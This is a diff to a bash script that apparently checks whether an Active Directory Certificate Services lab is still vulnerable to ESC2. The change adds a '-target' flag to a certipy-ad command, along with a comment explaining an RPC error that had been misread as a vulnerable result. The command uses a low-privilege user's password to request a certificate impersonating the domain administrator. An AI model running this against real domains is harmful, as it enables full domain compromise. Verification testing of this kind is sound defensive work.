@@ -6,9 +6,14 @@ set -euo pipefail
 
 cd "$(mktemp -d)"
 
+# -target is REQUIRED: without it certipy sends the RPC enrollment request to
+# -dc-ip, the DOMAIN CONTROLLER, which does not run CertSvc. Every run then died
+# with ept_s_not_registered for ICertRequestD, on gates 1 and 2 alike, which
+# read as "still vulnerable" both times. -dc-ip is for LDAP/Kerberos only.
 REQ=$(timeout 60 /usr/bin/certipy-ad req \
     -u 'alice@corp.local' -p 'Password1!' \
     -ca 'corp-ca01-CA' \
+    -target corp-ca01.corp.local \
     -dc-ip 10.20.30.5 \
     -template 'ESC2-AnyPurpose' \
     -upn 'administrator@corp.local' 2>&1 || true)
